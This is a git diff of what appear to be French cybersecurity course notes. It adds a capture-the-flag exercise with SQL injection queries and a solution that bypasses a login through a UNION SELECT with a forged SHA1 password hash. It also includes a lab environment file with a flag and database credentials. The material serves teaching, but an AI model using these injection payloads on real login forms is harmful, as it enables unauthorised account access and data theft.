@@ -178,3 +178,29 @@ toto' OR 1 --
 1\' OR 1 --
 
 https://greta-formation-cyber.up.railway.app
+
+# Exo Cyrhade
+
+```sql
+SELECT id, email, first_name, last_name, password FROM users WHERE email='**'
+SELECT id, email, first_name, last_name, password FROM users WHERE email='' OR 1=1 LIMIT 1,1 -- -'
+SELECT id, email, first_name, last_name, password FROM users WHERE email='' OR 1=1 UNION SELECT 1,2,3,4,5 LIMIT 1,1  -- -'
+```
+
+# Solution
+
+```sql
+SELECT id, email, first_name, last_name, password FROM users WHERE email='' UNION SELECT 1,2,3,4,'86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' -- -'
+
+et password 'a' => sha1('a') == "86f7e437faa5a7fce15d1ddcb9eaeaea377667b8"
+```
+
+```txt
+APP_ENV=dev
+DEFAULT_CTF_FLAG=862e6c1bcba9334d52af702907c50285ed8e42a1
+
+MYSQL_HOST=db
+MYSQL_DBNAME=agence_immo
+MYSQL_USER=immo_user
+MYSQL_PASS=simpleSqlPass
+```
